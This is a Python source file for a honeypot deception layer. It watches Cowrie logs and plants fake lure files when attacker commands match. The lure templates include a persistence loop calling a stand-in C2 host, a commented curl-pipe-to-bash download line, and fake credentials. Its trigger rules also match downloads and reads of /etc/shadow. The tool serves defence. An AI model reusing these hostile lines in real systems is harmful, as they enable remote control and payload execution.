#!/usr/bin/env python3
"""
MORPH - Reactive Deception Layer

Watches Cowrie logs in real-time and plants fake files into honeyfs/
based on attacker behavior.

Usage:
    python3 reactor.py

Requires: pip install watchdog
"""

import json
import os
import random
import signal
import string
import subprocess
import threading
import time
from datetime import datetime
from pathlib import Path
from typing import Callable, Any

from watchdog.observers import Observer
from watchdog.events import FileSystemEventHandler

# Paths
COWRIE_LOG = "/home/nb/cowrie/var/log/cowrie/cowrie.json"
HONEYFS_ROOT = "/home/nb/cowrie/honeyfs"
FS_PICKLE = "/home/nb/cowrie/src/cowrie/data/fs.pickle"
FSCTL = "/home/nb/cowrie/cowrie-env/bin/fsctl"
PID_FILE = "/home/nb/cowrie/twistd.pid"
REACTOR_LOG = Path(__file__).parent / "reactor.log"

# Track file position for tail-like behavior
_file_position = 0
_position_lock = threading.Lock()

# Batch fsctl commands to avoid too many subprocess calls
_pending_fs_paths: list[str] = []
_fs_paths_lock = threading.Lock()


def _log(message: str) -> None:
    """Log a reactor action."""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_entry = f"[{timestamp}] {message}\n"
    
    with open(REACTOR_LOG, "a", encoding="utf-8") as f:
        f.write(log_entry)
    
    # Also print to console
    print(log_entry.strip())


def _register_in_pickle(relative_path: str, is_directory: bool = False) -> None:
    """Queue a path to be registered in Cowrie's fs.pickle."""
    abs_path = "/" + relative_path.lstrip("/")
    
    with _fs_paths_lock:
        # Add mkdir commands for parent directories
        parts = Path(abs_path).parts
        for i in range(2, len(parts)):
            dir_path = "/".join(parts[:i])
            if dir_path not in _pending_fs_paths:
                _pending_fs_paths.append(f"mkdir {dir_path}")
        
        # Add the file/directory itself
        cmd = f"mkdir {abs_path}" if is_directory else f"touch {abs_path}"
        if cmd not in _pending_fs_paths:
            _pending_fs_paths.append(cmd)


def _flush_fs_commands() -> bool:
    """Execute all pending fsctl commands and reload Cowrie."""
    with _fs_paths_lock:
        if not _pending_fs_paths:
            return True
        
        commands = _pending_fs_paths.copy()
        _pending_fs_paths.clear()
    
    # Build fsctl input
    fsctl_input = "\n".join(commands) + "\nexit\n"
    _log(f"Running fsctl with {len(commands)} commands")
    
    try:
        # Run fsctl to update fs.pickle
        result = subprocess.run(
            [FSCTL, FS_PICKLE],
            input=fsctl_input,
            text=True,
            capture_output=True,
            timeout=30
        )
        
        if result.returncode != 0:
            _log(f"fsctl failed: {result.stderr}")
            return False
        
        _log(f"fs.pickle updated successfully")
        
        # Send SIGHUP to Cowrie to reload
        _reload_cowrie()
        return True
        
    except FileNotFoundError:
        _log(f"fsctl not found at {FSCTL}")
        return False
    except subprocess.TimeoutExpired:
        _log("fsctl timed out")
        return False
    except Exception as e:
        _log(f"fsctl error: {e}")
        return False


def _reload_cowrie() -> bool:
    """Send SIGHUP to Cowrie to reload fs.pickle."""
    try:
        pid_path = Path(PID_FILE)
        if not pid_path.exists():
            _log(f"PID file not found: {PID_FILE}")
            return False
        
        pid = int(pid_path.read_text().strip())
        os.kill(pid, signal.SIGHUP)
        _log(f"Sent SIGHUP to Cowrie (PID {pid})")
        return True
        
    except ValueError as e:
        _log(f"Invalid PID in file: {e}")
        return False
    except ProcessLookupError:
        _log("Cowrie process not found")
        return False
    except PermissionError:
        _log("Permission denied sending SIGHUP")
        return False
    except Exception as e:
        _log(f"SIGHUP failed: {e}")
        return False


def _write_honeyfs_file(relative_path: str, content: str) -> bool:
    """Write a file into honeyfs and register in fs.pickle."""
    full_path = Path(HONEYFS_ROOT) / relative_path
    
    if full_path.exists():
        return False
    
    try:
        full_path.parent.mkdir(parents=True, exist_ok=True)
        full_path.write_text(content, encoding="utf-8")
        _log(f"Created: {relative_path}")
        
        _register_in_pickle(relative_path)
        return True
    except IOError as e:
        _log(f"Error creating {relative_path}: {e}")
        return False


def _create_empty_file(relative_path: str) -> bool:
    """Create an empty file in honeyfs and register in fs.pickle."""
    full_path = Path(HONEYFS_ROOT) / relative_path
    
    if full_path.exists():
        return False
    
    try:
        full_path.parent.mkdir(parents=True, exist_ok=True)
        full_path.touch()
        _log(f"Created (empty): {relative_path}")
        
        _register_in_pickle(relative_path)
        return True
    except IOError as e:
        _log(f"Error creating {relative_path}: {e}")
        return False


def _random_string(length: int = 8) -> str:
    """Generate a random alphanumeric string."""
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))


# === Fake Content Templates ===

FAKE_CONFIG_PHP = """<?php
// Database configuration - Production
// Last updated: 2024-03-10

define('DB_HOST', 'db.internal.corp');
define('DB_NAME', 'webapp_prod');
define('DB_USER', 'webapp_admin');
define('DB_PASS', 'Pr0d_DB_P@ss_2024!');

// API Keys
define('STRIPE_SECRET', 'sk_live_51HG8k2CjEXAMPLEKEY');
define('AWS_KEY', 'AKIAIOSFODNN7EXAMPLE');

// Debug mode - DISABLE IN PRODUCTION
define('DEBUG', false);

$conn = new mysqli(DB_HOST, DB_USER, DB_PASS, DB_NAME);
?>
"""

FAKE_GIT_CONFIG = """[core]
\trepositoryformatversion = 0
\tfilemode = true
\tbare = false
\tlogallrefupdates = true
[remote "origin"]
\turl = git@github.com:internal-corp/webapp-prod.git
\tfetch = +refs/heads/*:refs/remotes/origin/*
[branch "main"]
\tremote = origin
\tmerge = refs/heads/main
[user]
\tname = Deploy Bot
\temail = deploy@internal.corp
"""

FAKE_MONITOR_SCRIPT = """#!/bin/bash
# Persistence monitor - DO NOT REMOVE
# Contact: admin@internal.corp

while true; do
    curl -s http://c2.evil.corp/heartbeat?id=$(hostname) > /dev/null 2>&1
    sleep 300
done
"""

FAKE_SSH_KEY = """ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC7z8k3N5F5L... (truncated) deploy@internal.corp
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDk9p2R7T... (truncated) backup@internal.corp
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAI... jenkins@ci.internal.corp
"""

FAKE_BASH_HISTORY = """cd /var/www/html
cat config.php
mysql -u root -p'R00t_DB_P@ss!' webapp_prod
mysqldump webapp_prod > /tmp/dump.sql
scp /tmp/dump.sql backup@10.0.0.5:/backups/
rm /tmp/dump.sql
curl -O http://updates.internal.corp/deploy.sh
chmod +x deploy.sh
./deploy.sh
history -c
"""

FAKE_BACKUP_SCRIPT = """#!/bin/bash
# Nightly backup script
# Runs via cron at 2:00 AM

BACKUP_DIR="/opt/backup"
DB_USER="backup_svc"
DB_PASS="B@ckup_2024_Secure!"
DB_NAME="production"

DATE=$(date +%Y%m%d)

mysqldump -u$DB_USER -p$DB_PASS $DB_NAME | gzip > $BACKUP_DIR/db_backup_$DATE.sql.gz

# Sync to remote
rsync -avz $BACKUP_DIR/ backup@storage.internal.corp:/archives/

# Cleanup old backups (keep 30 days)
find $BACKUP_DIR -name "*.sql.gz" -mtime +30 -delete
"""

FAKE_MALWARE_PLACEHOLDER = """#!/bin/bash
# Dropped payload - detected and neutered
# Original hash: {hash}
# Detected: {date}

echo "Payload intercepted by security team"
exit 0

# --- Original content below (defanged) ---
# curl http://malware.evil.corp/stage2.sh | bash
# This system has been cleaned.
"""


# === Reaction Handlers ===

def react_to_www(cmd: str, session_id: str) -> None:
    """React to /var/www exploration."""
    _log(f"[{session_id}] Triggered: www exploration ({cmd})")
    _write_honeyfs_file("var/www/html/config.php", FAKE_CONFIG_PHP)
    _write_honeyfs_file("var/www/html/.git/config", FAKE_GIT_CONFIG)
    _flush_fs_commands()


def react_to_process_list(cmd: str, session_id: str) -> None:
    """React to process listing commands."""
    _log(f"[{session_id}] Triggered: process listing ({cmd})")
    _write_honeyfs_file("tmp/.monitor", FAKE_MONITOR_SCRIPT)
    _flush_fs_commands()


def react_to_passwd_access(cmd: str, session_id: str) -> None:
    """React to password file access."""
    _log(f"[{session_id}] Triggered: passwd/shadow access ({cmd})")
    _write_honeyfs_file("home/deploy/.ssh/authorized_keys", FAKE_SSH_KEY)
    _write_honeyfs_file("home/deploy/.bash_history", FAKE_BASH_HISTORY)
    _flush_fs_commands()


def react_to_file_search(cmd: str, session_id: str) -> None:
    """React to find/locate commands."""
    _log(f"[{session_id}] Triggered: file search ({cmd})")
    _create_empty_file("opt/backup/db_backup_2024.sql.gz")
    _write_honeyfs_file("opt/scripts/backup.sh", FAKE_BACKUP_SCRIPT)
    _flush_fs_commands()


def react_to_download(cmd: str, session_id: str) -> None:
    """React to wget/curl downloads."""
    _log(f"[{session_id}] Triggered: download attempt ({cmd})")
    fake_name = f".{_random_string(6)}.sh"
    fake_content = FAKE_MALWARE_PLACEHOLDER.format(
        hash=_random_string(32),
        date=datetime.now().strftime("%Y-%m-%d %H:%M")
    )
    _write_honeyfs_file(f"tmp/{fake_name}", fake_content)
    _flush_fs_commands()


# === Reaction Rules ===

REACTION_RULES: list[tuple[list[str], Callable]] = [
    (["ls /var/www", "cd /var/www", "ls -la /var/www"], react_to_www),
    (["ps aux", "ps -ef", "top", "htop"], react_to_process_list),
    (["cat /etc/passwd", "cat /etc/shadow"], react_to_passwd_access),
    (["find /", "find .", "locate "], react_to_file_search),
    (["wget ", "curl -O", "curl http", "wget http"], react_to_download),
]


def check_reactions(command: str, session_id: str) -> None:
    """Check if a command triggers any reactions."""
    cmd_lower = command.lower()
    
    for patterns, handler in REACTION_RULES:
        for pattern in patterns:
            if pattern.lower() in cmd_lower:
                handler(command, session_id)
                return


def process_event(event: dict[str, Any]) -> None:
    """Process a single Cowrie log event and trigger reactions."""
    session_id = event.get("session", "unknown")
    command = event.get("input", "")
    
    if command:
        check_reactions(command, session_id)


class CowrieLogHandler(FileSystemEventHandler):
    """Handle file modification events for cowrie.json."""
    
    def on_modified(self, event):
        if event.src_path.endswith("cowrie.json"):
            self._process_new_lines()
    
    def _process_new_lines(self):
        global _file_position
        
        try:
            with _position_lock:
                with open(COWRIE_LOG, "r", encoding="utf-8") as f:
                    f.seek(_file_position)
                    new_lines = f.readlines()
                    _file_position = f.tell()
            
            for line in new_lines:
                line = line.strip()
                if not line:
                    continue
                
                try:
                    event = json.loads(line)
                    process_event(event)
                except json.JSONDecodeError:
                    continue
        
        except IOError as e:
            _log(f"Error reading log: {e}")


def _init_file_position():
    """Initialize file position to end of file (only process new events)."""
    global _file_position
    
    log_path = Path(COWRIE_LOG)
    if log_path.exists():
        _file_position = log_path.stat().st_size
        _log(f"Starting at end of log (position {_file_position})")
    else:
        _file_position = 0
        _log("Log file not found, will watch for creation")


def start_reactor() -> Observer:
    """Start the reactor file watcher. Returns the Observer instance."""
    _log("=" * 60)
    _log("MORPH Reactor starting")
    _log(f"Watching: {COWRIE_LOG}")
    _log(f"Honeyfs: {HONEYFS_ROOT}")
    _log(f"fsctl: {FSCTL}")
    _log(f"fs.pickle: {FS_PICKLE}")
    _log("=" * 60)
    
    # Ensure honeyfs directory exists
    Path(HONEYFS_ROOT).mkdir(parents=True, exist_ok=True)
    
    # Start at end of file
    _init_file_position()
    
    # Set up file watcher
    event_handler = CowrieLogHandler()
    observer = Observer()
    
    log_dir = str(Path(COWRIE_LOG).parent)
    Path(log_dir).mkdir(parents=True, exist_ok=True)
    
    observer.schedule(event_handler, log_dir, recursive=False)
    observer.start()
    
    _log("Reactor started - watching for attacker commands")
    
    return observer


def stop_reactor(observer: Observer) -> None:
    """Stop the reactor file watcher."""
    _log("Stopping MORPH Reactor")
    observer.stop()
    observer.join()
    _log("Reactor stopped")


if __name__ == "__main__":
    print("MORPH Reactor - Real-time Deception Layer")
    print("=" * 60)
    print(f"Monitoring: {COWRIE_LOG}")
    print(f"Honeyfs:    {HONEYFS_ROOT}")
    print(f"Log file:   {REACTOR_LOG}")
    print()
    print("Press Ctrl+C to stop")
    print("=" * 60)
    print()
    
    observer = start_reactor()
    
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\nShutting down...")
        stop_reactor(observer)
        print("Done.")
